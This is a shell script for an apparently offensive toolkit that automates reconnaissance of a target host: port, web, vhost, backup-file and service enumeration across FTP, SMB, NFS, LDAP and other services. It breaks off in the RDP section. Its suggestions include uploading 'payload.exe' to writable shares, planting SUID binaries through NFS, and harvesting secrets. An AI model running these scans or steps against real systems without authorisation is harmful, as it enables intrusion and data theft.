#!/bin/sh
# SLRecon — Automated Reconnaissance Pipeline (SeaLion)
# POSIX-compatible, runs on target or attacker machine
#
# Usage: slrecon.sh <target> [OPTIONS]
#   -o           Save output to loot/recon/<target>/
#   -l           Upload report to SeaLion loot
#   -s           Silent — no terminal output
#   -L <ip>      SeaLion server IP
#   --fast       Quick scan (top ports + basic web)
#   --phase <p>  Run single phase: ports, web, services, report
#   --no-ping    Force -Pn on all nmap scans
#   -h           Help

# ── Config ───────────────────────────────────────────────────
TARGET=""
OUTDIR=""
SAVE=0
LOOT=0
SILENT=0
LHOST=""
FAST=0
PHASE=""
NO_PING=0
SCAN_NAME=""
START_TIME=$(date +%s)

# ── Colors ───────────────────────────────────────────────────
R='\033[1;31m'
Y='\033[1;33m'
G='\033[1;32m'
C='\033[1;36m'
B='\033[1;34m'
W='\033[1;37m'
M='\033[1;35m'
N='\033[0m'

# ── Argument parsing ─────────────────────────────────────────
usage() {
  cat <<'USAGE'
SLRecon — Automated Reconnaissance Pipeline (SeaLion)

Usage: slrecon.sh <target> [OPTIONS]

Options:
  -o            Save output to loot/recon/<target>/
  -l            Upload report to SeaLion loot
  -s            Silent — suppress terminal output
  -L <ip>       SeaLion server IP (auto-detected if omitted)
  --fast        Quick scan: top 1000 ports + basic web enum
  --phase <p>   Run single phase: ports, web, services, report
  --no-ping     Force -Pn on nmap (skip host discovery)
  -h            Show this help

Phases:
  ports         Nmap TCP + UDP scan
  web           Web enumeration (dirs, vhosts, tech, WAF)
  services      Service-specific enum (SMB, FTP, SSH, DB, etc.)
  report        Generate report from existing scan data

Examples:
  ./slrecon.sh 10.129.14.128
  ./slrecon.sh 10.129.14.128 -o -l
  ./slrecon.sh 10.129.14.128 --fast
  ./slrecon.sh 10.129.14.128 --phase web
  ./slrecon.sh 10.129.14.128 --no-ping -o
USAGE
  exit 0
}

while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help) usage ;;
    -o) SAVE=1; shift ;;
    -l) LOOT=1; SAVE=1; shift ;;
    -s) SILENT=1; SAVE=1; shift ;;
    -L) shift; LHOST="$1"; shift ;;
    --fast) FAST=1; shift ;;
    --no-ping) NO_PING=1; shift ;;
    --phase) shift; PHASE="$1"; shift ;;
    --name) shift; SCAN_NAME="$1"; shift ;;
    -*)
      _flags=$(echo "$1" | sed 's/^-//')
      shift
      case "$_flags" in *o*) SAVE=1 ;; esac
      case "$_flags" in *l*) LOOT=1; SAVE=1 ;; esac
      case "$_flags" in *s*) SILENT=1; SAVE=1 ;; esac
      ;;
    *)
      if [ -z "$TARGET" ]; then
        TARGET="$1"
      fi
      shift
      ;;
  esac
done

if [ -z "$TARGET" ]; then
  echo "Usage: slrecon.sh <target> [OPTIONS]"
  echo "Run slrecon.sh -h for help"
  exit 1
fi

# ── Output engine ────────────────────────────────────────────
_strip_colors() { sed 's/\x1b\[[0-9;]*m//g'; }

emit() {
  if [ -n "$OUTDIR" ] && [ "$SILENT" -eq 1 ]; then
    printf "%s\n" "$1" | _strip_colors >> "$OUTDIR/report.txt"
  elif [ -n "$OUTDIR" ]; then
    printf "%s\n" "$1"
    printf "%s\n" "$1" | _strip_colors >> "$OUTDIR/report.txt"
  else
    printf "%s\n" "$1"
  fi
}

emit_raw() {
  if [ -n "$OUTDIR" ] && [ "$SILENT" -eq 1 ]; then
    printf "%b\n" "$1" | _strip_colors >> "$OUTDIR/report.txt"
  elif [ -n "$OUTDIR" ]; then
    printf "%b\n" "$1"
    printf "%b\n" "$1" | _strip_colors >> "$OUTDIR/report.txt"
  else
    printf "%b\n" "$1"
  fi
}

section() {
  emit_raw ""
  emit_raw "${C}═══════════════════════════════════════════════${N}"
  emit_raw "${C}  $1${N}"
  emit_raw "${C}═══════════════════════════════════════════════${N}"
  emit_raw ""
}

hi()   { emit_raw "${R}[!] $1${N}"; }
warn() { emit_raw "${Y}[*] $1${N}"; }
info() { emit_raw "${G}[+] $1${N}"; }
phase_hdr() { emit_raw "\n${M}══ PHASE: $1 ══${N}\n"; }

_has() { command -v "$1" >/dev/null 2>&1; }

_elapsed() {
  _now=$(date +%s)
  _diff=$((_now - START_TIME))
  _min=$((_diff / 60))
  _sec=$((_diff % 60))
  printf "%dm%ds" "$_min" "$_sec"
}

# ── Setup output directory ───────────────────────────────────
if [ "$SAVE" -eq 1 ]; then
  _outname="${SCAN_NAME:-$TARGET}"
  OUTDIR="loot/recon/$_outname"
  mkdir -p "$OUTDIR" 2>/dev/null || OUTDIR="/tmp/slrecon_$_outname"
  mkdir -p "$OUTDIR" 2>/dev/null
  : > "$OUTDIR/report.txt"
fi

# ── Auto-detect LHOST ────────────────────────────────────────
if [ -z "$LHOST" ]; then
  for f in /proc/net/tcp /proc/net/tcp6; do
    [ -r "$f" ] || continue
    _candidate=$(awk '$4 == "01" {split($3,a,":"); if (a[1] != "00000000" && a[1] != "0100007F") print a[1]}' "$f" 2>/dev/null | head -1)
    if [ -n "$_candidate" ]; then
      _hex="$_candidate"
      _a=$(printf "%d" "0x$(echo "$_hex" | cut -c7-8)" 2>/dev/null)
      _b=$(printf "%d" "0x$(echo "$_hex" | cut -c5-6)" 2>/dev/null)
      _c=$(printf "%d" "0x$(echo "$_hex" | cut -c3-4)" 2>/dev/null)
      _d=$(printf "%d" "0x$(echo "$_hex" | cut -c1-2)" 2>/dev/null)
      LHOST="$_a.$_b.$_c.$_d"
      break
    fi
  done
fi

# ── Recommendations collector ────────────────────────────────
_RECS_FILE=$(mktemp 2>/dev/null || echo "/tmp/.slrecon_recs_$$")
: > "$_RECS_FILE"
_rec() { echo "$1" >> "$_RECS_FILE"; }

# ── Nmap flags ───────────────────────────────────────────────
NMAP_BASE=""
if [ "$NO_PING" -eq 1 ]; then
  NMAP_BASE="-Pn"
fi

_check_ping() {
  if [ "$NO_PING" -eq 1 ]; then return; fi
  if ! ping -c 1 -W 2 "$TARGET" >/dev/null 2>&1; then
    warn "Host does not respond to ping — adding -Pn"
    NMAP_BASE="-Pn"
    NO_PING=1
  fi
}

# ══════════════════════════════════════════════════════════════
#                         BANNER
# ══════════════════════════════════════════════════════════════
emit_raw ""
emit_raw "${B}╔══════════════════════════════════════════════╗${N}"
emit_raw "${B}║${W}    SLRecon — Automated Reconnaissance        ${B}║${N}"
emit_raw "${B}║${G}              SeaLion Toolkit                 ${B}║${N}"
emit_raw "${B}╚══════════════════════════════════════════════╝${N}"
emit_raw ""
info "Target: $TARGET"
info "Mode: $([ "$FAST" -eq 1 ] && echo 'FAST' || echo 'FULL')"
[ -n "$PHASE" ] && info "Phase: $PHASE"
[ -n "$OUTDIR" ] && info "Output: $OUTDIR/"
emit_raw ""

# ══════════════════════════════════════════════════════════════
#              PHASE 1 — PORT SCAN
# ══════════════════════════════════════════════════════════════
phase_ports() {
  phase_hdr "PORT SCAN"

  if ! _has nmap; then
    hi "nmap not found — skipping port scan"
    _rec "[WARN] nmap not installed — install it for port scanning"
    return
  fi

  _check_ping

  # Step 1: fast full-port discovery
  section "TCP PORT DISCOVERY"
  if [ "$FAST" -eq 1 ]; then
    info "Fast scan: top 1000 ports"
    nmap $NMAP_BASE -T4 --open "$TARGET" 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/nmap_fast.txt}" /dev/null | while IFS= read -r line; do
      emit "$line"
    done
  else
    info "Full TCP scan: all 65535 ports (this may take a while)"
    nmap $NMAP_BASE -p- -T4 --open --min-rate 1000 "$TARGET" 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/nmap_allports.txt}" /dev/null | while IFS= read -r line; do
      emit "$line"
    done
  fi

  # Extract open ports
  _scan_file=""
  if [ "$FAST" -eq 1 ] && [ -f "$OUTDIR/nmap_fast.txt" ]; then
    _scan_file="$OUTDIR/nmap_fast.txt"
  elif [ -f "$OUTDIR/nmap_allports.txt" ]; then
    _scan_file="$OUTDIR/nmap_allports.txt"
  fi

  OPEN_PORTS=""
  if [ -n "$_scan_file" ]; then
    OPEN_PORTS=$(grep -oE '^[0-9]+/tcp' "$_scan_file" 2>/dev/null | cut -d/ -f1 | sort -n | tr '\n' ',' | sed 's/,$//')
  fi

  if [ -z "$OPEN_PORTS" ]; then
    OPEN_PORTS=$(nmap $NMAP_BASE -p- -T4 --open --min-rate 1000 "$TARGET" 2>/dev/null | grep -oE '^[0-9]+/tcp' | cut -d/ -f1 | sort -n | tr '\n' ',' | sed 's/,$//')
  fi

  if [ -z "$OPEN_PORTS" ]; then
    warn "No open TCP ports found"
    return
  fi

  info "Open TCP ports: $OPEN_PORTS"
  [ -n "$OUTDIR" ] && echo "$OPEN_PORTS" > "$OUTDIR/open_ports.txt"

  # Step 2: version + scripts on discovered ports
  section "SERVICE DETECTION"
  info "Running version detection + default scripts on: $OPEN_PORTS"
  nmap $NMAP_BASE -sV -sC -p "$OPEN_PORTS" "$TARGET" 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/nmap_services.txt}" /dev/null | while IFS= read -r line; do
    emit "$line"
  done

  # Targeted NSE scripts per service
  _nse_scripts=""
  echo "$OPEN_PORTS" | tr ',' '\n' | while read -r _p; do
    case "$_p" in
      21)   _nse_scripts="ftp-anon,ftp-syst" ;;
      25)   _nse_scripts="smtp-commands,smtp-enum-users,smtp-open-relay" ;;
      53)   _nse_scripts="dns-zone-transfer,dns-nsid" ;;
      80|443|8080|8443|8000|3000)
            _nse_scripts="http-enum,http-headers,http-methods,http-robots.txt" ;;
      110)  _nse_scripts="pop3-capabilities" ;;
      111)  _nse_scripts="rpcinfo,nfs-ls,nfs-showmount,nfs-statfs" ;;
      139|445) _nse_scripts="smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln-ms17-010" ;;
      143)  _nse_scripts="imap-capabilities" ;;
      389|636) _nse_scripts="ldap-rootdse,ldap-search" ;;
      993|995) continue ;;
      2049) _nse_scripts="nfs-ls,nfs-showmount,nfs-statfs" ;;
      3306) _nse_scripts="mysql-info,mysql-enum,mysql-empty-password" ;;
      3389) _nse_scripts="rdp-enum-encryption,rdp-ntlm-info" ;;
      5432) _nse_scripts="pgsql-brute" ;;
      5900|5901) _nse_scripts="vnc-info" ;;
      6379) _nse_scripts="redis-info" ;;
      8009) _nse_scripts="ajp-methods" ;;
      27017) _nse_scripts="mongodb-info,mongodb-databases" ;;
    esac
    if [ -n "$_nse_scripts" ]; then
      info "NSE scripts for port $_p: $_nse_scripts"
      nmap $NMAP_BASE --script "$_nse_scripts" -p "$_p" "$TARGET" 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/nmap_nse_${_p}.txt}" /dev/null | while IFS= read -r line; do
        emit "$line"
      done
      _nse_scripts=""
    fi
  done

  # Step 3: UDP top ports
  if [ "$FAST" -eq 0 ]; then
    section "UDP SCAN (top 50)"
    info "Scanning top 50 UDP ports..."
    nmap $NMAP_BASE -sU --top-ports 50 -T4 "$TARGET" 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/nmap_udp.txt}" /dev/null | while IFS= read -r line; do
      emit "$line"
    done
  fi

  info "Port scan completed ($(_elapsed))"
}

# ══════════════════════════════════════════════════════════════
#              PHASE 2 — WEB ENUMERATION
# ══════════════════════════════════════════════════════════════
phase_web() {
  phase_hdr "WEB ENUMERATION"

  # Determine HTTP ports from scan results or common ones
  _http_ports=""
  if [ -f "$OUTDIR/nmap_services.txt" ]; then
    _http_ports=$(grep -iE 'http|ssl/http|https' "$OUTDIR/nmap_services.txt" 2>/dev/null | grep -oE '^[0-9]+' | sort -u | tr '\n' ' ')
  fi
  if [ -z "$_http_ports" ]; then
    for _tp in 80 443 8080 8443 8000 3000 8888; do
      if (echo >/dev/tcp/"$TARGET"/"$_tp") 2>/dev/null; then
        _http_ports="$_http_ports $_tp"
      fi
    done
  fi

  if [ -z "$_http_ports" ]; then
    warn "No HTTP ports detected — skipping web enum"
    return
  fi

  info "HTTP ports found: $_http_ports"

  for _hp in $_http_ports; do
    _proto="http"
    case "$_hp" in 443|8443|*43) _proto="https" ;; esac
    _base="${_proto}://${TARGET}:${_hp}"

    section "WEB — $_base"

    # ── WAF detection ──
    if _has wafw00f; then
      info "WAF detection..."
      _waf=$(wafw00f "$_base" 2>/dev/null) || true
      if echo "$_waf" | grep -qi "is behind"; then
        _waf_name=$(echo "$_waf" | grep -i "is behind" | head -1)
        hi "WAF detected: $_waf_name"
        _rec "[INFO] WAF detected on $_base: $_waf_name — may need to adjust payloads"
      else
        info "No WAF detected"
      fi
    fi

    # ── Headers + tech ──
    emit_raw "\n${W}--- Headers ---${N}"
    _headers=$(curl -skI -m 5 "$_base/" 2>/dev/null) || true
    if [ -n "$_headers" ]; then
      emit "$_headers"
      [ -n "$OUTDIR" ] && echo "$_headers" > "$OUTDIR/headers_${_hp}.txt"

      _server=$(echo "$_headers" | grep -i '^Server:' | head -1 | cut -d: -f2- | xargs)
      _powered=$(echo "$_headers" | grep -i '^X-Powered-By:' | head -1 | cut -d: -f2- | xargs)
      [ -n "$_server" ] && info "Server: $_server"
      [ -n "$_powered" ] && info "Powered by: $_powered"
      [ -n "$_server" ] && _rec "[ENUM] Web server on :$_hp → $_server — search for CVEs"
      [ -n "$_powered" ] && _rec "[ENUM] $_powered on :$_hp — search for CVEs"
    fi

    # ── SSL/TLS check ──
    if [ "$_proto" = "https" ] || [ "$_hp" = "443" ]; then
      if _has nmap; then
        info "SSL/TLS cipher check..."
        nmap --script ssl-enum-ciphers -p "$_hp" "$TARGET" 2>/dev/null | grep -E 'TLSv|SSLv|VULNERABLE|WARNING' | while IFS= read -r line; do
          emit "  $line"
        done
      fi
    fi

    # ── robots.txt + sitemap ──
    emit_raw "\n${W}--- robots.txt ---${N}"
    _robots=$(curl -sk -m 5 "$_base/robots.txt" 2>/dev/null) || true
    if echo "$_robots" | grep -qiE 'disallow|allow|sitemap'; then
      emit "$_robots"
      [ -n "$OUTDIR" ] && echo "$_robots" > "$OUTDIR/robots_${_hp}.txt"
      _rec "[ENUM] robots.txt found on :$_hp — review disallowed paths"
    else
      info "No robots.txt"
    fi

    _sitemap=$(curl -sk -m 5 "$_base/sitemap.xml" 2>/dev/null) || true
    if echo "$_sitemap" | grep -qi '<urlset\|<sitemapindex'; then
      info "sitemap.xml found"
      echo "$_sitemap" | grep -oE 'https?://[^<"]+' | head -20 | while read -r _su; do
        emit "  $_su"
      done
      [ -n "$OUTDIR" ] && echo "$_sitemap" > "$OUTDIR/sitemap_${_hp}.xml"
    fi

    # ── CMS detection ──
    emit_raw "\n${W}--- CMS detection ---${N}"
    _body=$(curl -sk -m 5 "$_base/" 2>/dev/null | head -100) || true
    _cms=""
    if echo "$_body" | grep -qi 'wp-content\|wp-includes\|wordpress'; then
      _cms="WordPress"
    elif echo "$_body" | grep -qi 'joomla'; then
      _cms="Joomla"
    elif echo "$_body" | grep -qi 'drupal'; then
      _cms="Drupal"
    elif echo "$_body" | grep -qi 'roundcube'; then
      _cms="Roundcube"
    elif [ -n "$_powered" ] && echo "$_powered" | grep -qi 'express'; then
      _cms="Express.js"
    fi

    if [ -n "$_cms" ]; then
      hi "CMS detected: $_cms"
      _rec "[ENUM] $_cms detected on :$_hp — search for known vulns and default creds"
      case "$_cms" in
        WordPress)
          if _has wpscan; then
            info "Running wpscan..."
            wpscan --url "$_base" --enumerate vp,vt,u --no-banner 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/wpscan_${_hp}.txt}" /dev/null | while IFS= read -r line; do
              emit "$line"
            done
          else
            warn "wpscan not installed — install for WordPress enum"
          fi
          ;;
      esac
    else
      info "No common CMS detected"
    fi

    # ── Directory bruteforce ──
    section "DIRECTORY SCAN — :$_hp"

    _wordlist=""
    for _wl in /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
               /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
               /usr/share/seclists/Discovery/Web-Content/common.txt \
               /usr/share/dirb/wordlists/common.txt \
               /usr/share/wordlists/dirb/common.txt; do
      if [ -f "$_wl" ]; then
        _wordlist="$_wl"
        break
      fi
    done

    if [ -z "$_wordlist" ]; then
      warn "No wordlist found — skipping directory bruteforce"
    elif _has ffuf; then
      info "ffuf directory scan with $(basename "$_wordlist")"
      ffuf -u "$_base/FUZZ" -w "$_wordlist" -mc 200,204,301,302,307,401,403,405 -t 50 -c -o "${OUTDIR:+$OUTDIR/ffuf_dirs_${_hp}.json}" -of json 2>/dev/null | grep -vE '^\[|^$|:: Progress' | while IFS= read -r line; do
        emit "$line"
      done
    elif _has gobuster; then
      info "gobuster directory scan with $(basename "$_wordlist")"
      gobuster dir -u "$_base" -w "$_wordlist" -t 50 -q --no-error -o "${OUTDIR:+$OUTDIR/gobuster_dirs_${_hp}.txt}" 2>/dev/null | while IFS= read -r line; do
        emit "$line"
      done
    elif _has dirb; then
      info "dirb scan..."
      dirb "$_base" "$_wordlist" -S -r 2>/dev/null | grep -E '^==> |CODE:' | while IFS= read -r line; do
        emit "$line"
      done
    else
      warn "No directory scanner available (ffuf, gobuster, dirb)"
    fi

    # ── VHost discovery ──
    section "VHOST SCAN — :$_hp"

    _vhost_wl=""
    for _vwl in /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
                /usr/share/seclists/Discovery/DNS/namelist.txt \
                /usr/share/wordlists/amass/subdomains-top1mil-5000.txt; do
      if [ -f "$_vwl" ]; then
        _vhost_wl="$_vwl"
        break
      fi
    done

    if [ -z "$_vhost_wl" ]; then
      warn "No subdomain wordlist — skipping VHost scan"
    elif _has ffuf; then
      _baseline_size=$(curl -sk -m 5 -H "Host: nonexistent.xyz" "$_base/" 2>/dev/null | wc -c)
      info "VHost fuzzing (filtering size: $_baseline_size)"
      ffuf -u "$_base/" -H "Host: FUZZ.$TARGET" -w "$_vhost_wl" -fs "$_baseline_size" -mc 200,302,301,401,403 -t 50 -c 2>/dev/null | grep -vE '^\[|^$|:: Progress' | while IFS= read -r line; do
        emit "$line"
        _rec "[ENUM] VHost found on :$_hp — check: $line"
      done
    else
      warn "ffuf not installed — skipping VHost scan"
    fi

    # ── Backup file probe ──
    emit_raw "\n${W}--- Backup file probe ---${N}"
    for _bpath in index.php index.html config.php wp-config.php .htaccess web.config; do
      for _bext in .bak .old .save "~" .swp .orig .dist .txt .zip; do
        _burl="$_base/${_bpath}${_bext}"
        _bcode=$(curl -sk -o /dev/null -w '%{http_code}' -m 3 "$_burl" 2>/dev/null) || true
        if [ "$_bcode" = "200" ]; then
          hi "BACKUP: $_burl (200 OK)"
          _rec "[ENUM] Backup file accessible: $_burl — download and review"
        fi
      done
    done

    # ── JS analysis ──
    emit_raw "\n${W}--- JavaScript endpoint extraction ---${N}"
    _jsfiles=$(curl -sk -m 5 "$_base/" 2>/dev/null | grep -oE 'src="[^"]*\.js"' | sed 's/src="//;s/"//' | head -10) || true
    if [ -n "$_jsfiles" ]; then
      echo "$_jsfiles" | while read -r _js; do
        case "$_js" in
          http*) _jsurl="$_js" ;;
          /*)    _jsurl="$_base$_js" ;;
          *)     _jsurl="$_base/$_js" ;;
        esac
        _jscontent=$(curl -sk -m 5 "$_jsurl" 2>/dev/null) || true
        _endpoints=$(echo "$_jscontent" | grep -oE '["'"'"'](/api/[^"'"'"']+|/v[0-9]/[^"'"'"']+)' | sort -u | head -10) || true
        _secrets=$(echo "$_jscontent" | grep -oiE '(api_key|apikey|token|secret|password|authorization)['"'"'"\s]*[:=]['"'"'"\s]*[a-zA-Z0-9+/=_-]{8,}' | head -5) || true
        if [ -n "$_endpoints" ]; then
          warn "Endpoints in $_js:"
          echo "$_endpoints" | while read -r _ep; do emit "  $_ep"; done
        fi
        if [ -n "$_secrets" ]; then
          hi "Secrets in $_js:"
          echo "$_secrets" | while read -r _sec; do emit "  $_sec"; done
          _rec "[PRIVESC] Hardcoded secrets found in $_js — review immediately"
        fi
      done
    fi

    # ── Parameter discovery ──
    if _has arjun && [ "$FAST" -eq 0 ]; then
      emit_raw "\n${W}--- Parameter discovery ---${N}"
      info "Running arjun on $_base..."
      arjun -u "$_base/" -q -t 10 2>/dev/null | while IFS= read -r line; do
        emit "$line"
      done
    fi

    # ── Nikto ──
    if _has nikto && [ "$FAST" -eq 0 ]; then
      section "NIKTO — :$_hp"
      info "Running nikto (this takes a while)..."
      nikto -h "$_base" -nointeractive -C all 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/nikto_${_hp}.txt}" /dev/null | while IFS= read -r line; do
        emit "$line"
      done
    fi

  done

  info "Web enumeration completed ($(_elapsed))"
}

# ══════════════════════════════════════════════════════════════
#              PHASE 3 — SERVICE ENUMERATION
# ══════════════════════════════════════════════════════════════
phase_services() {
  phase_hdr "SERVICE ENUMERATION"

  # Read open ports
  _ports=""
  if [ -f "$OUTDIR/open_ports.txt" ]; then
    _ports=$(cat "$OUTDIR/open_ports.txt")
  elif [ -f "$OUTDIR/nmap_services.txt" ]; then
    _ports=$(grep -oE '^[0-9]+/tcp' "$OUTDIR/nmap_services.txt" | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//')
  fi

  if [ -z "$_ports" ]; then
    warn "No port data — run ports phase first or provide scan results"
    return
  fi

  _has_port() { echo ",$_ports," | grep -q ",$1,"; }

  # ── FTP ──
  if _has_port 21; then
    section "FTP (21)"
    info "Testing anonymous login..."
    _ftp_out=$(curl -s -m 10 "ftp://$TARGET/" --user "anonymous:anonymous" 2>&1) || true
    if [ -n "$_ftp_out" ] && ! echo "$_ftp_out" | grep -qi "denied\|failed\|Login incorrect\|530"; then
      hi "FTP anonymous login SUCCESSFUL"
      emit "$_ftp_out"
      [ -n "$OUTDIR" ] && echo "$_ftp_out" > "$OUTDIR/ftp_listing.txt"
      _rec "[PRIVESC] FTP anonymous login works — enumerate and download:"
      _rec "  → ftp $TARGET  (user: anonymous, pass: anonymous)"
      _rec "  → wget -m --no-passive ftp://anonymous:anonymous@$TARGET/"
      if echo "$_ftp_out" | grep -qiE '\.txt|\.conf|\.bak|\.xml|\.cfg|\.ini|\.sh|\.py|\.key|\.pem|id_rsa'; then
        _rec "  → Sensitive files detected in FTP listing — download immediately"
      fi
    else
      info "Anonymous login failed"
    fi
  fi

  # ── SSH ──
  if _has_port 22; then
    section "SSH (22)"
    if _has ssh-audit; then
      info "Running ssh-audit..."
      ssh-audit "$TARGET" 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/ssh_audit.txt}" /dev/null | grep -iE 'vulner|weak|fail|WARN|CVE' | while IFS= read -r line; do
        hi "$line"
        _rec "[ENUM] SSH vulnerability: $line"
      done
    fi
    _ssh_ver=$(nmap $NMAP_BASE -sV -p 22 "$TARGET" 2>/dev/null | grep '22/tcp' | sed 's/.*  //') || true
    [ -n "$_ssh_ver" ] && info "SSH version: $_ssh_ver"
  fi

  # ── SMTP ──
  if _has_port 25; then
    section "SMTP (25)"
    info "Testing SMTP commands..."
    _smtp=$(echo "VRFY root" | nc -w 3 "$TARGET" 25 2>/dev/null) || true
    if echo "$_smtp" | grep -q "252\|250"; then
      hi "SMTP VRFY enabled — user enumeration possible"
      [ -n "$OUTDIR" ] && echo "$_smtp" > "$OUTDIR/smtp_vrfy.txt"
      _rec "[ENUM] SMTP VRFY enabled on :25 → enumerate users:"
      _rec "  → smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t $TARGET"
      _rec "  → smtp-user-enum -M RCPT -U users.txt -t $TARGET"
      _rec "  → nmap --script smtp-enum-users -p 25 $TARGET"
    fi
  fi

  # ── DNS ──
  if _has_port 53; then
    section "DNS (53)"
    if _has dig; then
      info "Attempting zone transfer..."
      _zt=$(dig @"$TARGET" axfr "$TARGET" 2>/dev/null) || true
      if echo "$_zt" | grep -q "XFR size"; then
        hi "Zone transfer SUCCESSFUL"
        emit "$_zt"
        [ -n "$OUTDIR" ] && echo "$_zt" > "$OUTDIR/dns_zonetransfer.txt"
        _rec "[PRIVESC] DNS zone transfer allowed — full domain map obtained"
        _rec "  → Review $OUTDIR/dns_zonetransfer.txt for internal hostnames"
        _rec "  → dig @$TARGET axfr <domain>"
        _rec "  → Add discovered hostnames to /etc/hosts for further enum"
      else
        info "Zone transfer denied"
      fi
    fi
    if _has dnsenum; then
      info "Running dnsenum..."
      _dnsenum_out=$(dnsenum --dnsserver "$TARGET" "$TARGET" --noreverse 2>/dev/null | head -50) || true
      if [ -n "$_dnsenum_out" ]; then
        echo "$_dnsenum_out" | while IFS= read -r line; do emit "$line"; done
        [ -n "$OUTDIR" ] && echo "$_dnsenum_out" > "$OUTDIR/dnsenum.txt"
      fi
    fi
  fi

  # ── NFS ──
  if _has_port 2049 || _has_port 111; then
    section "NFS (2049)"
    if _has showmount; then
      info "Checking NFS exports..."
      _nfs=$(showmount -e "$TARGET" 2>/dev/null) || true
      if [ -n "$_nfs" ]; then
        emit "$_nfs"
        [ -n "$OUTDIR" ] && echo "$_nfs" > "$OUTDIR/nfs_exports.txt"
        echo "$_nfs" | grep -v '^Export' | while IFS= read -r _export_line; do
          _export_path=$(echo "$_export_line" | awk '{print $1}')
          _export_who=$(echo "$_export_line" | awk '{print $2}')
          [ -z "$_export_path" ] && continue
          _rec "[PRIVESC] NFS export: $_export_path ($_export_who) — mount and inspect:"
          _rec "  → mkdir -p /mnt/nfs_${TARGET}"
          _rec "  → mount -t nfs $TARGET:$_export_path /mnt/nfs_${TARGET}"
          _rec "  → ls -la /mnt/nfs_${TARGET}"
          if echo "$_export_who" | grep -q '\*'; then
            _rec "  → Export open to * — check no_root_squash: create SUID binary if writable"
          fi
        done
      else
        info "No NFS exports or showmount failed"
      fi
    else
      warn "showmount not available — try: showmount -e $TARGET"
    fi
  fi

  # ── SMB ──
  if _has_port 445 || _has_port 139; then
    section "SMB (445)"
    if _has enum4linux-ng; then
      info "Running enum4linux-ng..."
      enum4linux-ng -A "$TARGET" 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/enum4linux.txt}" /dev/null | grep -iE 'share|user|password|anonymous|null|writable' | while IFS= read -r line; do
        emit "$line"
      done
    elif _has enum4linux; then
      info "Running enum4linux..."
      enum4linux -a "$TARGET" 2>/dev/null | tee -a "${OUTDIR:+$OUTDIR/enum4linux.txt}" /dev/null | grep -iE 'share|user|password|anonymous|null' | while IFS= read -r line; do
        emit "$line"
      done
    fi

    if _has smbmap; then
      info "smbmap null session..."
      _smbmap_out=$(smbmap -H "$TARGET" -u '' -p '' 2>/dev/null) || true
      if [ -n "$_smbmap_out" ]; then
        echo "$_smbmap_out" | while IFS= read -r line; do
          emit "$line"
        done
        [ -n "$OUTDIR" ] && echo "$_smbmap_out" > "$OUTDIR/smbmap.txt"
        echo "$_smbmap_out" | grep -iE 'READ|WRITE' | while IFS= read -r line; do
          _share_name=$(echo "$line" | awk '{print $1}')
          _share_perm=$(echo "$line" | grep -oiE 'READ|WRITE' | tr '\n' '+' | sed 's/+$//')
          [ -z "$_share_name" ] && continue
          _rec "[ENUM] SMB share \\\"$_share_name\\\" — $_share_perm access:"
          _rec "  → smbclient //$TARGET/$_share_name -N"
          _rec "  → smbmap -H $TARGET -u '' -p '' -r $_share_name"
          if echo "$_share_perm" | grep -qi 'WRITE'; then
            _rec "  → WRITABLE! Upload payload: smbclient //$TARGET/$_share_name -N -c 'put payload.exe'"
          fi
          _rec "  → Download all: smbget -R smb://$TARGET/$_share_name/ -U ''"
        done
      fi
    fi

    if _has smbclient; then
      info "smbclient share listing..."
      _smb_list=$(smbclient -L "//$TARGET" -N 2>/dev/null) || true
      if [ -n "$_smb_list" ]; then
        echo "$_smb_list" | while IFS= read -r line; do
          emit "$line"
        done
        [ -n "$OUTDIR" ] && echo "$_smb_list" > "$OUTDIR/smbclient_shares.txt"
        echo "$_smb_list" | grep -i 'Disk' | while IFS= read -r line; do
          _share_name=$(echo "$line" | sed 's/^[[:space:]]*//' | awk '{print $1}')
          [ -z "$_share_name" ] && continue
          [ "$_share_name" = "IPC\$" ] && continue
          _rec "[ENUM] SMB share found: $_share_name → smbclient //$TARGET/$_share_name -N"
        done
      fi
    fi
  fi

  # ── LDAP ──
  if _has_port 389 || _has_port 636; then
    section "LDAP (389)"
    if _has ldapsearch; then
      info "Testing anonymous bind..."
      _ldap=$(ldapsearch -x -H "ldap://$TARGET" -b "" -s base "(objectclass=*)" 2>/dev/null) || true
      if [ -n "$_ldap" ]; then
        emit "$_ldap"
        [ -n "$OUTDIR" ] && echo "$_ldap" > "$OUTDIR/ldap_base.txt"
        _ldap_base=$(echo "$_ldap" | grep -i 'namingContexts' | head -1 | awk '{print $2}')
        _rec "[ENUM] LDAP anonymous bind works — enumerate:"
        if [ -n "$_ldap_base" ]; then
          _rec "  → ldapsearch -x -H ldap://$TARGET -b '$_ldap_base' '(objectclass=person)'"
          _rec "  → ldapsearch -x -H ldap://$TARGET -b '$_ldap_base' '(objectclass=*)' | grep -i pass"
        else
          _rec "  → ldapsearch -x -H ldap://$TARGET -b 'DC=domain,DC=local' '(objectclass=*)'"
        fi
        _rec "  → ldapdomaindump -u '' -p '' ldap://$TARGET -o $OUTDIR/ldap/"
      fi
    fi
  fi

  # ── RDP ──
  if _has_port 3389; then
    section "RDP (3389)"
    if _has rdp-sec-check; then
      info "Running rdp-sec-check..."
      _rdp_sec=$(rdp-sec-check "$TARGET" 2>/dev/null) || true
      if [ -n "$_rdp_sec" ]; then
        echo "$_rdp_sec" | while IFS= read -r line; do emit "$line"; done
        [ -n "$OUTDIR" ] && echo "$_rdp_sec" > "$OUTDIR/rdp_sec_check.txt"
      fi
    fi
    _rdp_nla=$(nmap $NMAP_BASE --script rdp-ntlm-info -p 3389 "$TARGET" 2>/dev/null | grep -i 'Target_Name\|Product_Version\|DNS_Domain') || true
    if [ -n "$_rdp_nla" ]; then
      info "RDP NTL info:"
      emit "$_rdp_nla"
